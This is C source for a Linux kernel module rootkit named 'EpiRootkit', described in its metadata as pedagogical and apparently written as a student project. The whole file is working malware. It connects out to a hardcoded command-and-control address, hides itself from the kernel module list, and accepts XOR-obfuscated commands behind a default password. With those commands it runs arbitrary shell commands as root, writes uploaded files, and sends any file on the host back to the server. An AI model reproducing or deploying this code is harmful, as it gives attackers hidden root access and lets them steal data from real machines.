#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;

// Connection state management
static int connection_state = 0; // 0: disconnected, 1: connected
static unsigned long last_reconnect_attempt = 0;
#define RECONNECT_DELAY_MS 3000 // 3 seconds between reconnection attempts

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void xor_cipher(char *data, size_t len) {
    size_t i;
    size_t key_len = strlen(config.xor_key);
    for (i = 0; i < len; i++)
        data[i] ^= config.xor_key[i % key_len];
}

static int send_data(const char *msg, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = {
        .iov_base = (void *)msg,
        .iov_len = len
    };
    int ret;

    if (!g_sock || !msg) {
        pr_err("epirootkit: Cannot send data - invalid socket or message\n");
        return -EINVAL;
    }

    ret = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
    if (ret < 0)
        pr_err("epirootkit: Failed to send data: %d\n", ret);
    return ret;
}

static int receive_data(char *buf, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
}

// --- AUTHENTICATION ---
static char rk_password[64] = "epirootkit";
static int is_authenticated = 0;

static int handle_auth(const char *cmd) {
    if (strncmp(cmd, "auth ", 5) == 0) {
        const char *pw = cmd + 5;
        if (strncmp(pw, rk_password, strlen(rk_password)) == 0) {
            is_authenticated = 1;
            send_data("OK", 2);
        } else {
            send_data("FAIL", 4);
        }
        return 1;
    }
    if (strncmp(cmd, "auth change ", 12) == 0) {
        const char *newpw = cmd + 12;
        size_t len = strlen(newpw);
        if (len > 0 && len < sizeof(rk_password)) {
            strncpy(rk_password, newpw, sizeof(rk_password)-1);
            rk_password[sizeof(rk_password)-1] = '\0';
            send_data("Password changed successfully", 27);
        } else {
            send_data("Password change failed", 22);
        }
        return 1;
    }
    return 0;
}

// --- FILE UPLOAD/DOWNLOAD ---
static int handle_upload(const char *cmd, int msglen) {
    if (strncmp(cmd, "upload ", 7) == 0) {
        char remote[256];
        int size;
        if (sscanf(cmd+7, "%255s %d", remote, &size) == 2 && size > 0) {
            struct file *fp = filp_open(remote, O_WRONLY|O_CREAT|O_TRUNC, 0600);
            if (IS_ERR(fp)) {
                send_data("Upload failed", 13);
                return 1;
            }
            char *buf = kmalloc(size, GFP_KERNEL);
            if (!buf) {
                filp_close(fp, NULL);
                send_data("Upload failed", 13);
                return 1;
            }
            int recvd = 0;
            while (recvd < size) {
                int r = receive_data(buf+recvd, size-recvd);
                if (r <= 0) break;
                recvd += r;
            }
            kernel_write(fp, buf, size, 0);
            filp_close(fp, NULL);
            kfree(buf);
            send_data("Upload success", 14);
            return 1;
        }
    }
    return 0;
}

static int handle_download(const char *cmd) {
    if (strncmp(cmd, "download ", 9) == 0) {
        char remote[256];
        if (sscanf(cmd+9, "%255s", remote) == 1) {
            struct file *fp = filp_open(remote, O_RDONLY, 0);
            if (IS_ERR(fp)) {
                send_data("Download failed", 15);
                return 1;
            }
            char buf[2048];
            int r = kernel_read(fp, 0, buf, sizeof(buf));
            filp_close(fp, NULL);
            if (r > 0) {
                send_data(buf, r);
            } else {
                send_data("Download failed", 15);
            }
            return 1;
        }
    }
    return 0;
}

static struct list_head *prev_module;

static void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_INFO "epirootkit: Module hidden from list\n");
}

static void unhide_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
        printk(KERN_INFO "epirootkit: Module unhidden\n");
    }
}

static int handle_hide_commands(const char *cmd) {
    if (strcmp(cmd, "hide module") == 0) {
        hide_module();
        send_data("Module hidden successfully", 24);
        return 1;
    }
    if (strcmp(cmd, "unhide module") == 0) {
        unhide_module();
        send_data("Module unhidden successfully", 26);
        return 1;
    }
    return 0;
}

static int execute_command(const char *command) {
    struct subprocess_info *sub_info = NULL;
    struct file *output_file = NULL;
    char output_path[] = "/tmp/.rk_tmp";
    char *cmd = NULL;
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int status = 0;
    char *output_buf = NULL;
    loff_t pos = 0;
    int len = 0;

    // Allocate command buffer
    cmd = kmalloc(4096, GFP_KERNEL);
    if (!cmd) {
        pr_err("epirootkit: failed to allocate memory for command\n");
        return -ENOMEM;
    }

    // Prepare command to capture both stdout and stderr
    snprintf(cmd, 4096, "%s > %s 2>&1", command, output_path);
    char *argv[] = { "/bin/sh", "-c", cmd, NULL };

    // Setup and execute command
    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info) {
        pr_err("epirootkit: failed to setup command execution\n");
        kfree(cmd);
        return -EFAULT;
    }

    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    status = status >> 8;

    // Allocate output buffer
    output_buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!output_buf) {
        pr_err("epirootkit: failed to allocate output buffer\n");
        kfree(cmd);
        return -ENOMEM;
    }

    // Read command output
    output_file = filp_open(output_path, O_RDONLY, 0);
    if (IS_ERR(output_file)) {
        pr_err("epirootkit: failed to open output file: %ld\n", PTR_ERR(output_file));
        kfree(output_buf);
        kfree(cmd);
        return PTR_ERR(output_file);
    }

    len = kernel_read(output_file, output_buf, config.buffer_size - 1, &pos);
    if (len < 0) {
        pr_err("epirootkit: failed to read output\n");
        filp_close(output_file, NULL);
        kfree(output_buf);
        kfree(cmd);
        return len;
    }

    output_buf[len] = '\0';
    xor_cipher(output_buf, len);
    send_data(output_buf, len);

    // Cleanup
    filp_close(output_file, NULL);
    kfree(output_buf);
    kfree(cmd);

    return status;
}

static int command_loop(void *data) {
    char *buf;
    int ret = 0;

    // Set thread name for better debugging
    current->comm[0] = 'r';
    current->comm[1] = 'k';
    current->comm[2] = '\0';

    buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!buf) {
        pr_err("epirootkit: Failed to allocate command buffer\n");
        return -ENOMEM;
    }

    is_authenticated = 0;

    while (!kthread_should_stop()) {
        // Clear buffer for new command
        memset(buf, 0, config.buffer_size);

        // Try to receive data
        ret = receive_data(buf, config.buffer_size - 1);
        if (ret < 0) {
            pr_err("epirootkit: Error receiving data: %d\n", ret);
            if (ret == -ECONNRESET || ret == -EPIPE) {
                // Connection lost, try to reconnect
                msleep(RECONNECT_DELAY_MS);
                if (connect_to_server() < 0)
                    continue;
            }
            continue;
        }
        if (ret == 0) {
            msleep(1000); // No data, wait a bit
            continue;
        }

        xor_cipher(buf, ret);
        // --- AUTHENTICATION ---
        if (!is_authenticated) {
            handle_auth(buf);
            continue;
        }
        // --- AUTH CHANGE ---
        if (handle_auth(buf)) continue;
        // --- UPLOAD ---
        if (handle_upload(buf, ret)) continue;
        // --- DOWNLOAD ---
        if (handle_download(buf)) continue;
        // --- EXEC ---
        if (strncmp(buf, "exec ", 5) == 0) {
            char *cmd = buf + 5;
            int status = execute_command(cmd);
            if (status < 0) {
                char error[64];
                snprintf(error, sizeof(error), "Command execution failed: %d", status);
                send_data(error, strlen(error));
            }
            continue;
        }
        // --- HIDE/UNHIDE MODULE ---
        if (handle_hide_commands(buf)) continue;
        // Unknown command
        send_data("Unknown command", 15);
    }

    pr_info("epirootkit: Command thread stopping\n");
    kfree(buf);
    return ret;
}

static int connect_to_server(void) {
    struct sockaddr_in addr = { 0 };
    unsigned char ip_binary[4] = { 0 };
    int ret;

    // Don't try to reconnect too frequently
    if (jiffies_to_msecs(jiffies - last_reconnect_attempt) < RECONNECT_DELAY_MS)
        return -EAGAIN;

    last_reconnect_attempt = jiffies;

    if (g_sock) {
        sock_release(g_sock);
        g_sock = NULL;
    }

    // Convert IP address safely
    if (in4_pton(config.server_ip, -1, ip_binary, -1, NULL) == 0) {
        pr_err("epirootkit: Invalid IP address format: %s\n", config.server_ip);
        return -EINVAL;
    }

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (ret < 0) {
        pr_err("epirootkit: Failed to create socket: %d\n", ret);
        notify_connection_state(0);
        return ret;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(config.port);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

    ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        pr_err("epirootkit: Failed to connect to %s:%d (%d)\n",
               config.server_ip, config.port, ret);
        notify_connection_state(0);
        sock_release(g_sock);
        g_sock = NULL;
        return ret;
    }

    pr_info("epirootkit: Connected to %s:%d\n", config.server_ip, config.port);
    notify_connection_state(1);
    return 0;
}

static int __init rk_init(void) {
    int ret = connect_to_server();
    if (ret < 0) return ret;

    g_thread = kthread_run(command_loop, NULL, "rk_cmd_thread");
    if (IS_ERR(g_thread)) return PTR_ERR(g_thread);

    // Hide module by default
    hide_module();
    return 0;
}

static void __exit rk_exit(void) {
    unhide_module();
    if (g_thread) kthread_stop(g_thread);
    if (g_sock) sock_release(g_sock);
}

module_init(rk_init);
module_exit(rk_exit);

